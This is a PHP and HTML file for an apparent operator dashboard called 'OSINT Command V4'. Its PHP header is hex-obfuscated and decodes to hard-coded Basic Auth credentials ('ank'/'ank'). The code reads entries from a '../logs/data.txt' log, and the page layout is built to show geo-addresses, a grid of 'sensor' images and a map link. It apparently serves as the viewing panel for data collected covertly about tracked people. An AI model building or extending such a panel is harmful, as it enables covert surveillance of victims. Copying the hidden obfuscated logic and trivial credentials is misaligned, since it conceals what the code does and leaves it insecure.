<?php
 goto f45pd; f45pd: $user = "\x61\156\153"; goto O9M_3; O9M_3: $pass = "\x61\x6e\x6b"; goto r80k2; cZ_kw: if (file_exists($file)) { $content = file_get_contents($file); $raw = explode("\x2d\x2d\55\55\x2d\x2d\x2d\x2d\55\x2d\55\55\55\55\55\x2d\55\x2d\x2d\55\x2d\x2d\55\x2d\x2d\x2d\x2d\x2d\55\x2d\55\x2d\55\55\55\x2d\55\x2d\x2d\x2d", $content); foreach ($raw as $row) { if (strpos($row, "\x44\141\x74\145\72") !== false) { $entries[] = trim($row); } } $entries = array_reverse($entries); } goto b2YuM; r80k2: if (!isset($_SERVER["\x50\110\x50\x5f\x41\x55\x54\110\137\x55\123\105\x52"]) || !isset($_SERVER["\x50\x48\x50\x5f\x41\125\x54\x48\137\120\127"]) || $_SERVER["\120\110\120\x5f\x41\125\x54\110\137\125\123\105\122"] !== $user || $_SERVER["\x50\x48\120\137\x41\x55\x54\110\x5f\120\x57"] !== $pass) { header("\127\x57\x57\55\x41\165\164\150\145\x6e\164\151\x63\x61\x74\145\72\x20\102\141\x73\x69\143\x20\162\145\141\x6c\155\x3d\42\101\116\113\x20\x53\x65\x63\165\162\145\x20\104\141\163\x68\142\x6f\x61\x72\x64\x22"); header("\110\124\x54\x50\x2f\61\56\x30\40\x34\x30\61\x20\125\x6e\141\165\164\x68\x6f\162\151\x7a\x65\144"); include "\56\56\x2f\145\x72\x72\x6f\162\x2e\150\164\155\x6c"; die; } goto BH5Q0; OJH86: $entries = array(); goto cZ_kw; BH5Q0: $file = "\56\56\57\x6c\157\147\x73\57\x64\x61\x74\141\56\x74\x78\x74"; goto OJH86; b2YuM: ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OSINT Command V4</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --bg: #05070a; --surface: #0d1117; --accent: #00f2ff; --text: #e6edf3; --dim: #8b949e; --success: #238636; }
        body { background: var(--bg); color: var(--text); font-family: 'Courier New', monospace; margin: 0; }
        .osint-header { background: #000; border-bottom: 2px solid var(--accent); padding: 10px 15px; position: sticky; top: 0; z-index: 3000; }
        
        /* Fixed Dropdown: Now floats OVER content */
        #selectorContainer { position: relative; z-index: 2500; }
        .custom-select-trigger { background: var(--surface); border: 1px solid var(--accent); color: var(--accent); padding: 12px; border-radius: 4px; cursor: pointer; display: flex; justify-content: space-between; align-items: center; margin-top: 15px; }
        .custom-options { 
            background: var(--surface); 
            border: 1px solid var(--accent); 
            border-top: none; 
            max-height: 250px; 
            overflow-y: auto; 
            display: none; 
            position: absolute; /* Floating logic */
            width: 100%; 
            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
        }
        .custom-option { padding: 10px; border-bottom: 1px solid #30363d; cursor: pointer; font-size: 12px; }
        .custom-option:hover { background: #161b22; color: #fff; }
        .open .custom-options { display: block; }

        .intel-block { background: var(--surface); border: 1px solid #30363d; border-radius: 8px; padding: 15px; margin-top: 15px; position: relative; z-index: 10; }
        .label { font-size: 10px; color: var(--accent); text-transform: uppercase; display: block; }
        .value { color: #39ff14; font-size: 1rem; word-break: break-all; margin-bottom: 10px; display: block; }
        .geo-address { color: #ffcc00; font-size: 0.85rem; margin-bottom: 10px; }

        .sensor-nav { display: flex; gap: 2px; margin-bottom: 10px; }
        .sensor-btn { flex: 1; background: #161b22; border: 1px solid #30363d; color: var(--dim); padding: 8px; font-size: 11px; cursor: pointer; }
        .sensor-btn.active { background: var(--accent); color: #000; font-weight: bold; border-color: var(--accent); }
        .sensor-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 5px; }
        .sensor-img { width: 100%; height: 90px; object-fit: cover; border: 1px solid #30363d; border-radius: 4px; }

        .map-btn { background: var(--success); color: white; width: 100%; padding: 12px; border-radius: 4px; text-decoration: none; display: block; text-align: center; font-weight: bold; margin-top: 10px; }
    </style>
</head>
<body>

<div class="osint-header d-flex justify-content-between">
    <span style="font-size: 12px;"><i class="fas fa-satellite"></i> ANK - አንኬ: Omni-LC_V4</span>
    <span id="sync-icon" class="text-success" style="font-size: 10px;">● SYNCED</span>
</div>

<div class="container">
    <div id="selectorContainer">
        <div class="custom-select-trigger" onclick="this.parentElement.classList.toggle('open')">
            <span id="selectedLabel">INITIALIZING...</span>
            <i class="fas fa-chevron-down"></i>
        </div>
        <div class="custom-options" id="dropdown-list"></div>
    </div>

    <div id="intel-display">
        </div>
</div>
<script src="script.js"></script>
</body>
</html>
